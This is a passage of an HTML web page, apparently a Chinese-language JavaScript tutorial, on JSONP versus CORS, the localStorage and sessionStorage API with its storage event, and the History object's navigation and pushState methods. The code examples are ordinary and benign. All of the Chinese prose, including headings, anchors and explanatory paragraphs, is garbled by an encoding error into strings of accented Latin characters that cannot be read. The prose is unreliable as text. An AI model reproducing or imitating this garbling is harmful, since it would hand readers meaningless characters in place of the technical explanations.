<h3 id="ä¸-JSONP-çš„æ¯”è¾ƒ"><a href="#ä¸-JSONP-çš„æ¯”è¾ƒ" class="headerlink" title="ä¸ JSONP çš„æ¯”è¾ƒ"></a>ä¸ JSONP çš„æ¯”è¾ƒ</h3><p>CORS ä¸ JSONP çš„ä½¿ç”¨ç›®çš„ç›¸åŒï¼Œä½†æ˜¯æ¯” JSONP æ›´å¼ºå¤§ã€‚JSONP åªæ”¯æŒ<code>GET</code>è¯·æ±‚ï¼ŒCORS æ”¯æŒæ‰€æœ‰ç±»å‹çš„ HTTP è¯·æ±‚ã€‚JSONP çš„ä¼˜åŠ¿åœ¨äºæ”¯æŒè€å¼æµè§ˆå™¨ï¼Œä»¥åŠå¯ä»¥å‘ä¸æ”¯æŒ CORS çš„ç½‘ç«™è¯·æ±‚æ•°æ®ã€‚</p>
<h2 id="Storage-æ¥å£"><a href="#Storage-æ¥å£" class="headerlink" title="Storage æ¥å£"></a>Storage æ¥å£</h2><h3 id="æ¦‚è¿°-3"><a href="#æ¦‚è¿°-3" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>Storage æ¥å£ç”¨äºè„šæœ¬åœ¨æµè§ˆå™¨ä¿å­˜æ•°æ®ã€‚ä¸¤ä¸ªå¯¹è±¡éƒ¨ç½²äº†è¿™ä¸ªæ¥å£ï¼š<code>window.sessionStorage</code>å’Œ<code>window.localStorage</code>ã€‚</p>
<p><code>sessionStorage</code>ä¿å­˜çš„æ•°æ®ç”¨äºæµè§ˆå™¨çš„ä¸€æ¬¡ä¼šè¯ï¼ˆsessionï¼‰ï¼Œå½“ä¼šè¯ç»“æŸï¼ˆé€šå¸¸æ˜¯çª—å£å…³é—­ï¼‰ï¼Œæ•°æ®è¢«æ¸…ç©ºï¼›<code>localStorage</code>ä¿å­˜çš„æ•°æ®é•¿æœŸå­˜åœ¨ï¼Œä¸‹ä¸€æ¬¡è®¿é—®è¯¥ç½‘ç«™çš„æ—¶å€™ï¼Œç½‘é¡µå¯ä»¥ç›´æ¥è¯»å–ä»¥å‰ä¿å­˜çš„æ•°æ®ã€‚é™¤äº†ä¿å­˜æœŸé™çš„é•¿çŸ­ä¸åŒï¼Œè¿™ä¸¤ä¸ªå¯¹è±¡çš„å…¶ä»–æ–¹é¢éƒ½ä¸€è‡´ã€‚</p>
<p>ä¿å­˜çš„æ•°æ®éƒ½ä»¥â€œé”®å€¼å¯¹â€çš„å½¢å¼å­˜åœ¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸€é¡¹æ•°æ®éƒ½æœ‰ä¸€ä¸ªé”®åå’Œå¯¹åº”çš„å€¼ã€‚æ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯ä»¥æ–‡æœ¬æ ¼å¼ä¿å­˜ã€‚</p>
<p>è¿™ä¸ªæ¥å£å¾ˆåƒ Cookie çš„å¼ºåŒ–ç‰ˆï¼Œèƒ½å¤Ÿä½¿ç”¨å¤§å¾—å¤šçš„å­˜å‚¨ç©ºé—´ã€‚ç›®å‰ï¼Œæ¯ä¸ªåŸŸåçš„å­˜å‚¨ä¸Šé™è§†æµè§ˆå™¨è€Œå®šï¼ŒChrome æ˜¯ 2.5MBï¼ŒFirefox å’Œ Opera æ˜¯ 5MBï¼ŒIE æ˜¯ 10MBã€‚å…¶ä¸­ï¼ŒFirefox çš„å­˜å‚¨ç©ºé—´ç”±ä¸€çº§åŸŸåå†³å®šï¼Œè€Œå…¶ä»–æµè§ˆå™¨æ²¡æœ‰è¿™ä¸ªé™åˆ¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒFirefox ä¸­ï¼Œ<code>a.example.com</code>å’Œ<code>b.example.com</code>å…±äº« 5MB çš„å­˜å‚¨ç©ºé—´ã€‚å¦å¤–ï¼Œä¸ Cookie ä¸€æ ·ï¼Œå®ƒä»¬ä¹Ÿå—åŒåŸŸé™åˆ¶ã€‚æŸä¸ªç½‘é¡µå­˜å…¥çš„æ•°æ®ï¼Œåªæœ‰åŒåŸŸä¸‹çš„ç½‘é¡µæ‰èƒ½è¯»å–ï¼Œå¦‚æœè·¨åŸŸæ“ä½œä¼šæŠ¥é”™ã€‚</p>
<h3 id="å±æ€§å’Œæ–¹æ³•"><a href="#å±æ€§å’Œæ–¹æ³•" class="headerlink" title="å±æ€§å’Œæ–¹æ³•"></a>å±æ€§å’Œæ–¹æ³•</h3><p>Storage æ¥å£åªæœ‰ä¸€ä¸ªå±æ€§ã€‚</p>
<ul>
<li><code>Storage.length</code>ï¼šè¿”å›ä¿å­˜çš„æ•°æ®é¡¹ä¸ªæ•°ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">window.localStorage.setItem(&#39;foo&#39;, &#39;a&#39;);</span><br><span class="line">window.localStorage.setItem(&#39;bar&#39;, &#39;b&#39;);</span><br><span class="line">window.localStorage.setItem(&#39;baz&#39;, &#39;c&#39;);</span><br><span class="line"></span><br><span class="line">window.localStorage.length &#x2F;&#x2F; 3</span><br></pre></td></tr></table></figure>

<p>è¯¥æ¥å£æä¾›5ä¸ªæ–¹æ³•ã€‚</p>
<h4 id="Storage-setItem"><a href="#Storage-setItem" class="headerlink" title="Storage.setItem()"></a>Storage.setItem()</h4><p><code>Storage.setItem()</code>æ–¹æ³•ç”¨äºå­˜å…¥æ•°æ®ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯é”®åï¼Œç¬¬äºŒä¸ªæ˜¯ä¿å­˜çš„æ•°æ®ã€‚å¦‚æœé”®åå·²ç»å­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šæ›´æ–°å·²æœ‰çš„é”®å€¼ã€‚è¯¥æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.sessionStorage.setItem(&#39;key&#39;, &#39;value&#39;);</span><br><span class="line">window.localStorage.setItem(&#39;key&#39;, &#39;value&#39;);</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œ<code>Storage.setItem()</code>ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯å­—ç¬¦ä¸²ã€‚å¦‚æœä¸æ˜¯å­—ç¬¦ä¸²ï¼Œä¼šè‡ªåŠ¨è½¬æˆå­—ç¬¦ä¸²ï¼Œå†å­˜å…¥æµè§ˆå™¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.sessionStorage.setItem(3, &#123; foo: 1 &#125;);</span><br><span class="line">window.sessionStorage.getItem(&#39;3&#39;) &#x2F;&#x2F; &quot;[object Object]&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>setItem</code>æ–¹æ³•çš„ä¸¤ä¸ªå‚æ•°éƒ½ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œä½†æ˜¯å­˜å…¥çš„å€¼éƒ½æ˜¯å­—ç¬¦ä¸²ã€‚</p>
<p>å¦‚æœå‚¨å­˜ç©ºé—´å·²æ»¡ï¼Œè¯¥æ–¹æ³•ä¼šæŠ›é”™ã€‚</p>
<p>å†™å…¥ä¸ä¸€å®šè¦ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œç›´æ¥èµ‹å€¼ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ä¸‹é¢ä¸‰ç§å†™æ³•ç­‰ä»·</span><br><span class="line">window.localStorage.foo &#x3D; &#39;123&#39;;</span><br><span class="line">window.localStorage[&#39;foo&#39;] &#x3D; &#39;123&#39;;</span><br><span class="line">window.localStorage.setItem(&#39;foo&#39;, &#39;123&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="Storage-getItem"><a href="#Storage-getItem" class="headerlink" title="Storage.getItem()"></a>Storage.getItem()</h4><p><code>Storage.getItem()</code>æ–¹æ³•ç”¨äºè¯»å–æ•°æ®ã€‚å®ƒåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯é”®åã€‚å¦‚æœé”®åä¸å­˜åœ¨ï¼Œè¯¥æ–¹æ³•è¿”å›<code>null</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.sessionStorage.getItem(&#39;key&#39;)</span><br><span class="line">window.localStorage.getItem(&#39;key&#39;)</span><br></pre></td></tr></table></figure>

<p>é”®ååº”è¯¥æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™ä¼šè¢«è‡ªåŠ¨è½¬ä¸ºå­—ç¬¦ä¸²ã€‚</p>
<h4 id="Storage-removeItem"><a href="#Storage-removeItem" class="headerlink" title="Storage.removeItem()"></a>Storage.removeItem()</h4><p><code>Storage.removeItem()</code>æ–¹æ³•ç”¨äºæ¸…é™¤æŸä¸ªé”®åå¯¹åº”çš„é”®å€¼ã€‚å®ƒæ¥å—é”®åä½œä¸ºå‚æ•°ï¼Œå¦‚æœé”®åä¸å­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¸ä¼šåšä»»ä½•äº‹æƒ…ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessionStorage.removeItem(&#39;key&#39;);</span><br><span class="line">localStorage.removeItem(&#39;key&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="Storage-clear"><a href="#Storage-clear" class="headerlink" title="Storage.clear()"></a>Storage.clear()</h4><p><code>Storage.clear()</code>æ–¹æ³•ç”¨äºæ¸…é™¤æ‰€æœ‰ä¿å­˜çš„æ•°æ®ã€‚è¯¥æ–¹æ³•çš„è¿”å›å€¼æ˜¯<code>undefined</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.sessionStorage.clear()</span><br><span class="line">window.localStorage.clear()</span><br></pre></td></tr></table></figure>

<h4 id="Storage-key"><a href="#Storage-key" class="headerlink" title="Storage.key()"></a>Storage.key()</h4><p><code>Storage.key()</code>æ–¹æ³•æ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼ˆä»é›¶å¼€å§‹ï¼‰ï¼Œè¿”å›è¯¥ä½ç½®å¯¹åº”çš„é”®åã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.sessionStorage.setItem(&#39;key&#39;, &#39;value&#39;);</span><br><span class="line">window.sessionStorage.key(0) &#x2F;&#x2F; &quot;key&quot;</span><br></pre></td></tr></table></figure>

<p>ç»“åˆä½¿ç”¨<code>Storage.length</code>å±æ€§å’Œ<code>Storage.key()</code>æ–¹æ³•ï¼Œå¯ä»¥éå†æ‰€æœ‰çš„é”®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (var i &#x3D; 0; i &lt; window.localStorage.length; i++) &#123;</span><br><span class="line">  console.log(localStorage.key(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="storage-äº‹ä»¶"><a href="#storage-äº‹ä»¶" class="headerlink" title="storage äº‹ä»¶"></a>storage äº‹ä»¶</h3><p>Storage æ¥å£å‚¨å­˜çš„æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¼šè§¦å‘ storage äº‹ä»¶ï¼Œå¯ä»¥æŒ‡å®šè¿™ä¸ªäº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&#39;storage&#39;, onStorageChange);</span><br></pre></td></tr></table></figure>

<p>ç›‘å¬å‡½æ•°æ¥å—ä¸€ä¸ª<code>event</code>å®ä¾‹å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚è¿™ä¸ªå®ä¾‹å¯¹è±¡ç»§æ‰¿äº† StorageEvent æ¥å£ï¼Œæœ‰å‡ ä¸ªç‰¹æœ‰çš„å±æ€§ï¼Œéƒ½æ˜¯åªè¯»å±æ€§ã€‚</p>
<ul>
<li><code>StorageEvent.key</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå‘ç”Ÿå˜åŠ¨çš„é”®åã€‚å¦‚æœ storage äº‹ä»¶æ˜¯ç”±<code>clear()</code>æ–¹æ³•å¼•èµ·ï¼Œè¯¥å±æ€§è¿”å›<code>null</code>ã€‚</li>
<li><code>StorageEvent.newValue</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ–°çš„é”®å€¼ã€‚å¦‚æœ storage äº‹ä»¶æ˜¯ç”±<code>clear()</code>æ–¹æ³•æˆ–åˆ é™¤è¯¥é”®å€¼å¯¹å¼•å‘çš„ï¼Œè¯¥å±æ€§è¿”å›<code>null</code>ã€‚</li>
<li><code>StorageEvent.oldValue</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ—§çš„é”®å€¼ã€‚å¦‚æœè¯¥é”®å€¼å¯¹æ˜¯æ–°å¢çš„ï¼Œè¯¥å±æ€§è¿”å›<code>null</code>ã€‚</li>
<li><code>StorageEvent.storageArea</code>ï¼šå¯¹è±¡ï¼Œè¿”å›é”®å€¼å¯¹æ‰€åœ¨çš„æ•´ä¸ªå¯¹è±¡ã€‚ä¹Ÿè¯´æ˜¯è¯´ï¼Œå¯ä»¥ä»è¿™ä¸ªå±æ€§ä¸Šé¢æ‹¿åˆ°å½“å‰åŸŸåå‚¨å­˜çš„æ‰€æœ‰é”®å€¼å¯¹ã€‚</li>
<li><code>StorageEvent.url</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºåŸå§‹è§¦å‘ storage äº‹ä»¶çš„é‚£ä¸ªç½‘é¡µçš„ç½‘å€ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯<code>StorageEvent.key</code>å±æ€§çš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function onStorageChange(e) &#123;</span><br><span class="line">  console.log(e.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.addEventListener(&#39;storage&#39;, onStorageChange);</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œè¯¥äº‹ä»¶æœ‰ä¸€ä¸ªå¾ˆç‰¹åˆ«çš„åœ°æ–¹ï¼Œå°±æ˜¯å®ƒä¸åœ¨å¯¼è‡´æ•°æ®å˜åŒ–çš„å½“å‰é¡µé¢è§¦å‘ï¼Œè€Œæ˜¯åœ¨åŒä¸€ä¸ªåŸŸåçš„å…¶ä»–çª—å£è§¦å‘ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæµè§ˆå™¨åªæ‰“å¼€ä¸€ä¸ªçª—å£ï¼Œå¯èƒ½è§‚å¯Ÿä¸åˆ°è¿™ä¸ªäº‹ä»¶ã€‚æ¯”å¦‚åŒæ—¶æ‰“å¼€å¤šä¸ªçª—å£ï¼Œå½“å…¶ä¸­çš„ä¸€ä¸ªçª—å£å¯¼è‡´å‚¨å­˜çš„æ•°æ®å‘ç”Ÿæ”¹å˜æ—¶ï¼Œåªæœ‰åœ¨å…¶ä»–çª—å£æ‰èƒ½è§‚å¯Ÿåˆ°ç›‘å¬å‡½æ•°çš„æ‰§è¡Œã€‚å¯ä»¥é€šè¿‡è¿™ç§æœºåˆ¶ï¼Œå®ç°å¤šä¸ªçª—å£ä¹‹é—´çš„é€šä¿¡ã€‚</p>
<h2 id="History-å¯¹è±¡"><a href="#History-å¯¹è±¡" class="headerlink" title="History å¯¹è±¡"></a>History å¯¹è±¡</h2><h3 id="æ¦‚è¿°-4"><a href="#æ¦‚è¿°-4" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p><code>window.history</code>å±æ€§æŒ‡å‘ History å¯¹è±¡ï¼Œå®ƒè¡¨ç¤ºå½“å‰çª—å£çš„æµè§ˆå†å²ã€‚</p>
<p>History å¯¹è±¡ä¿å­˜äº†å½“å‰çª—å£è®¿é—®è¿‡çš„æ‰€æœ‰é¡µé¢ç½‘å€ã€‚ä¸‹é¢ä»£ç è¡¨ç¤ºå½“å‰çª—å£ä¸€å…±è®¿é—®è¿‡3ä¸ªç½‘å€ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.history.length &#x2F;&#x2F; 3</span><br></pre></td></tr></table></figure>

<p>ç”±äºå®‰å…¨åŸå› ï¼Œæµè§ˆå™¨ä¸å…è®¸è„šæœ¬è¯»å–è¿™äº›åœ°å€ï¼Œä½†æ˜¯å…è®¸åœ¨åœ°å€ä¹‹é—´å¯¼èˆªã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; åé€€åˆ°å‰ä¸€ä¸ªç½‘å€</span><br><span class="line">history.back()</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ç­‰åŒäº</span><br><span class="line">history.go(-1)</span><br></pre></td></tr></table></figure>

<p>æµè§ˆå™¨å·¥å…·æ çš„â€œå‰è¿›â€å’Œâ€œåé€€â€æŒ‰é’®ï¼Œå…¶å®å°±æ˜¯å¯¹ History å¯¹è±¡è¿›è¡Œæ“ä½œã€‚</p>
<h3 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><p>History å¯¹è±¡ä¸»è¦æœ‰ä¸¤ä¸ªå±æ€§ã€‚</p>
<ul>
<li><code>History.length</code>ï¼šå½“å‰çª—å£è®¿é—®è¿‡çš„ç½‘å€æ•°é‡ï¼ˆåŒ…æ‹¬å½“å‰ç½‘é¡µï¼‰</li>
<li><code>History.state</code>ï¼šHistory å †æ ˆæœ€ä¸Šå±‚çš„çŠ¶æ€å€¼ï¼ˆè¯¦è§ä¸‹æ–‡ï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; å½“å‰çª—å£è®¿é—®è¿‡å¤šå°‘ä¸ªç½‘é¡µ</span><br><span class="line">window.history.length &#x2F;&#x2F; 1</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; History å¯¹è±¡çš„å½“å‰çŠ¶æ€</span><br><span class="line">&#x2F;&#x2F; é€šå¸¸æ˜¯ undefinedï¼Œå³æœªè®¾ç½®</span><br><span class="line">window.history.state &#x2F;&#x2F; undefined</span><br></pre></td></tr></table></figure>

<h3 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h3><h4 id="History-back-ã€History-forward-ã€History-go"><a href="#History-back-ã€History-forward-ã€History-go" class="headerlink" title="History.back()ã€History.forward()ã€History.go()"></a>History.back()ã€History.forward()ã€History.go()</h4><p>è¿™ä¸‰ä¸ªæ–¹æ³•ç”¨äºåœ¨å†å²ä¹‹ä¸­ç§»åŠ¨ã€‚</p>
<ul>
<li><code>History.back()</code>ï¼šç§»åŠ¨åˆ°ä¸Šä¸€ä¸ªç½‘å€ï¼Œç­‰åŒäºç‚¹å‡»æµè§ˆå™¨çš„åé€€é”®ã€‚å¯¹äºç¬¬ä¸€ä¸ªè®¿é—®çš„ç½‘å€ï¼Œè¯¥æ–¹æ³•æ— æ•ˆæœã€‚</li>
<li><code>History.forward()</code>ï¼šç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªç½‘å€ï¼Œç­‰åŒäºç‚¹å‡»æµè§ˆå™¨çš„å‰è¿›é”®ã€‚å¯¹äºæœ€åä¸€ä¸ªè®¿é—®çš„ç½‘å€ï¼Œè¯¥æ–¹æ³•æ— æ•ˆæœã€‚</li>
<li><code>History.go()</code>ï¼šæ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼Œä»¥å½“å‰ç½‘å€ä¸ºåŸºå‡†ï¼Œç§»åŠ¨åˆ°å‚æ•°æŒ‡å®šçš„ç½‘å€ï¼Œæ¯”å¦‚<code>go(1)</code>ç›¸å½“äº<code>forward()</code>ï¼Œ<code>go(-1)</code>ç›¸å½“äº<code>back()</code>ã€‚å¦‚æœå‚æ•°è¶…è¿‡å®é™…å­˜åœ¨çš„ç½‘å€èŒƒå›´ï¼Œè¯¥æ–¹æ³•æ— æ•ˆæœï¼›å¦‚æœä¸æŒ‡å®šå‚æ•°ï¼Œé»˜è®¤å‚æ•°ä¸º<code>0</code>ï¼Œç›¸å½“äºåˆ·æ–°å½“å‰é¡µé¢ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">history.back();</span><br><span class="line">history.forward();</span><br><span class="line">history.go(-2);</span><br></pre></td></tr></table></figure>

<p><code>history.go(0)</code>ç›¸å½“äºåˆ·æ–°å½“å‰é¡µé¢ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history.go(0); &#x2F;&#x2F; åˆ·æ–°å½“å‰é¡µé¢</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œç§»åŠ¨åˆ°ä»¥å‰è®¿é—®è¿‡çš„é¡µé¢æ—¶ï¼Œé¡µé¢é€šå¸¸æ˜¯ä»æµè§ˆå™¨ç¼“å­˜ä¹‹ä¸­åŠ è½½ï¼Œè€Œä¸æ˜¯é‡æ–°è¦æ±‚æœåŠ¡å™¨å‘é€æ–°çš„ç½‘é¡µã€‚</p>
<h4 id="History-pushState"><a href="#History-pushState" class="headerlink" title="History.pushState()"></a>History.pushState()</h4><p><code>History.pushState()</code>æ–¹æ³•ç”¨äºåœ¨å†å²ä¸­æ·»åŠ ä¸€æ¡è®°å½•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.history.pushState(state, title, url)</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹æ³•æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œä¾æ¬¡ä¸ºï¼š</p>
<ul>
<li><code>state</code>ï¼šä¸€ä¸ªä¸æ·»åŠ çš„è®°å½•ç›¸å…³è”çš„çŠ¶æ€å¯¹è±¡ï¼Œä¸»è¦ç”¨äº<code>popstate</code>äº‹ä»¶ã€‚è¯¥äº‹ä»¶è§¦å‘æ—¶ï¼Œè¯¥å¯¹è±¡ä¼šä¼ å…¥å›è°ƒå‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæµè§ˆå™¨ä¼šå°†è¿™ä¸ªå¯¹è±¡åºåˆ—åŒ–ä»¥åä¿ç•™åœ¨æœ¬åœ°ï¼Œé‡æ–°è½½å…¥è¿™ä¸ªé¡µé¢çš„æ—¶å€™ï¼Œå¯ä»¥æ‹¿åˆ°è¿™ä¸ªå¯¹è±¡ã€‚å¦‚æœä¸éœ€è¦è¿™ä¸ªå¯¹è±¡ï¼Œæ­¤å¤„å¯ä»¥å¡«<code>null</code>ã€‚</li>
<li><code>title</code>ï¼šæ–°é¡µé¢çš„æ ‡é¢˜ã€‚ä½†æ˜¯ï¼Œç°åœ¨æ‰€æœ‰æµè§ˆå™¨éƒ½å¿½è§†è¿™ä¸ªå‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å¡«ç©ºå­—ç¬¦ä¸²ã€‚</li>
<li><code>url</code>ï¼šæ–°çš„ç½‘å€ï¼Œå¿…é¡»ä¸å½“å‰é¡µé¢å¤„åœ¨åŒä¸€ä¸ªåŸŸã€‚æµè§ˆå™¨çš„åœ°å€æ å°†æ˜¾ç¤ºè¿™ä¸ªç½‘å€ã€‚</li>
</ul>
<p>å‡å®šå½“å‰ç½‘å€æ˜¯<code>example.com/1.html</code>ï¼Œä½¿ç”¨<code>pushState()</code>æ–¹æ³•åœ¨æµè§ˆè®°å½•ï¼ˆHistory å¯¹è±¡ï¼‰ä¸­æ·»åŠ ä¸€ä¸ªæ–°è®°å½•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var stateObj &#x3D; &#123; foo: &#39;bar&#39; &#125;;</span><br><span class="line">history.pushState(stateObj, &#39;page 2&#39;, &#39;2.html&#39;);</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ æ–°è®°å½•åï¼Œæµè§ˆå™¨åœ°å€æ ç«‹åˆ»æ˜¾ç¤º<code>example.com/2.html</code>ï¼Œä½†å¹¶ä¸ä¼šè·³è½¬åˆ°<code>2.html</code>ï¼Œç”šè‡³ä¹Ÿä¸ä¼šæ£€æŸ¥<code>2.html</code>æ˜¯å¦å­˜åœ¨ï¼Œå®ƒåªæ˜¯æˆä¸ºæµè§ˆå†å²ä¸­çš„æœ€æ–°è®°å½•ã€‚è¿™æ—¶ï¼Œåœ¨åœ°å€æ è¾“å…¥ä¸€ä¸ªæ–°çš„åœ°å€(æ¯”å¦‚è®¿é—®<code>google.com</code>)ï¼Œç„¶åç‚¹å‡»äº†å€’é€€æŒ‰é’®ï¼Œé¡µé¢çš„ URL å°†æ˜¾ç¤º<code>2.html</code>ï¼›ä½ å†ç‚¹å‡»ä¸€æ¬¡å€’é€€æŒ‰é’®ï¼ŒURL å°†æ˜¾ç¤º<code>1.html</code>ã€‚</p>
<p>æ€»ä¹‹ï¼Œ<code>pushState()</code>æ–¹æ³•ä¸ä¼šè§¦å‘é¡µé¢åˆ·æ–°ï¼Œåªæ˜¯å¯¼è‡´ History å¯¹è±¡å‘ç”Ÿå˜åŒ–ï¼Œåœ°å€æ ä¼šæœ‰ååº”ã€‚</p>
<p>ä½¿ç”¨è¯¥æ–¹æ³•ä¹‹åï¼Œå°±å¯ä»¥ç”¨<code>History.state</code>å±æ€§è¯»å‡ºçŠ¶æ€å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var stateObj &#x3D; &#123; foo: &#39;bar&#39; &#125;;</span><br><span class="line">history.pushState(stateObj, &#39;page 2&#39;, &#39;2.html&#39;);</span><br><span class="line">history.state &#x2F;&#x2F; &#123;foo: &quot;bar&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœ<code>pushState</code>çš„ URL å‚æ•°è®¾ç½®äº†ä¸€ä¸ªæ–°çš„é”šç‚¹å€¼ï¼ˆå³<code>hash</code>ï¼‰ï¼Œå¹¶ä¸ä¼šè§¦å‘<code>hashchange</code>äº‹ä»¶ã€‚åè¿‡æ¥ï¼Œå¦‚æœ URL çš„é”šç‚¹å€¼å˜äº†ï¼Œåˆ™ä¼šåœ¨ History å¯¹è±¡åˆ›å»ºä¸€æ¡æµè§ˆè®°å½•ã€‚</p>
<p>å¦‚æœ<code>pushState()</code>æ–¹æ³•è®¾ç½®äº†ä¸€ä¸ªè·¨åŸŸç½‘å€ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; æŠ¥é”™</span><br><span class="line">&#x2F;&#x2F; å½“å‰ç½‘å€ä¸º http:&#x2F;&#x2F;example.com</span><br><span class="line">history.pushState(null, &#39;&#39;, &#39;https:&#x2F;&#x2F;twitter.com&#x2F;hello&#39;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>pushState</code>æƒ³è¦æ’å…¥ä¸€ä¸ªè·¨åŸŸçš„ç½‘å€ï¼Œå¯¼è‡´æŠ¥é”™ã€‚è¿™æ ·è®¾è®¡çš„ç›®çš„æ˜¯ï¼Œé˜²æ­¢æ¶æ„ä»£ç è®©ç”¨æˆ·ä»¥ä¸ºä»–ä»¬æ˜¯åœ¨å¦ä¸€ä¸ªç½‘ç«™ä¸Šï¼Œå› ä¸ºè¿™ä¸ªæ–¹æ³•ä¸ä¼šå¯¼è‡´é¡µé¢è·³è½¬ã€‚</p>
